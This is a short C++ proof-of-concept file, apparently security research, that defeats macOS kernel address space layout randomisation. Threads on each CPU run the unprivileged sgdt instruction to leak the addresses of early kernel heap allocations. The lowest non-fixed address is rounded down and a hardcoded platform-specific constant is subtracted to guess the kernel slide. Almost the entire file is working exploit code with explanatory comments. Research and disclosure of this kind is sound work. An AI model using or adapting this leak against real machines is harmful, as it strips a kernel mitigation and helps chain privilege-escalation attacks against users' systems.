// clang++ -o sgdt_kaslr sgdt_kaslr.cc -std=c++11
// tested on MacBookPro10,1 w/16GB RAM - the magic number probably varies per-platform

// sgdt is an unprivileged instructions, a process ay any privilege level
// can execute sgdt to get the address of that processors Global Descriptor Table
// pmap.h has the following comment:
//
// /*
//  * For KASLR, we alias the master processor's IDT and GDT at fixed
//  * virtual addresses to defeat SIDT/SGDT address leakage.
//  */
// #define MASTER_IDT_ALIAS  (VM_MIN_KERNEL_ADDRESS + 0x0000)
// #define MASTER_GDT_ALIAS  (VM_MIN_KERNEL_ADDRESS + 0x1000)
//
// executing sgdt on cpu0 returns this fixed address
// the GDTs for all other cpus are allocated very early on the heap
// in cpu_data_alloc()
//
// Since the heap begins at a fixed offset from the kernel text segment
// vm_init.c contains the following comment:
//
// /*
//  * Eat a random amount of kernel_map to fuzz subsequent heap, zone and
//  * stack addresses. (With a 4K page and 9 bits of randomness, this
//  * eats at most 2M of VA from the map.)
//  */
//
// The code then uses early_random() to make a randomly-sized allocation.
// However, since the granularity of kASLR is 2MB, if a suitably early
// kernel heap allocation address can be leaked then it's enough to guess
// the kASLR offset reasonably reliably (in testing at least 50% correct)
//
// The GDT allocations are suitably early and the state of the heap sufficiently
// deterministic that by executing sgdt on all cpus and filtering out the result
// for cpu0 you can with at least 50% reliability determine the kASLR slide

#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include <vector>
#include <algorithm>

using namespace std;

struct gdt_t {
  uint16_t limit;
  uint64_t base;
} __attribute__((packed)); 

uint64_t get_gdt(){
  struct gdt_t gdt;
  __asm__("sgdt %0" : "=m"(gdt));
  return gdt.base;
}

void* gdt_and_wait(void* arg){
  uint64_t gdt = get_gdt();
  volatile uint64_t busy = 0x10000000;
  while(busy--){;} /* try to get threads on all cpus */
  return (void*) gdt;
}

int main(int argc, char** argv){
  int n_threads = 20;
  pthread_t threads[n_threads];
  for(int i = 0; i < n_threads; i++){
    pthread_create(&threads[i], 0, gdt_and_wait, 0);
  }

  uint64_t gdts[n_threads];
  for(int i = 0; i < n_threads; i++){
    pthread_join(threads[i], (void**)&gdts[i]);
  }

  sort(&gdts[0], &gdts[n_threads]);
  vector<uint64_t> uniq;
  uniq.push_back(gdts[0]);
  for(int i = 1; i < n_threads; i++){
    if(gdts[i] != uniq[uniq.size() - 1]){
      uniq.push_back(gdts[i]);
    }
  }

  printf("gdt addresses:\n");
  for(uint64_t g : uniq){
    printf("%016llx\n", g);
  }

  // only cpu0 maps the gdt to a fixed address, the rest are very early heap allocations
  // take the lowest, round down to the nearest 2MB and subtract the fixed address of the
  // heap before it's slid
  uint64_t slide = uniq[1];
  slide &= ~((uint64_t)0x200000 - 1);
  uint64_t magic = 0xffffff81c7e00000;
  slide -= magic;
  printf("kaslr slide guess: %08llx\n", slide);
  return 0;
}
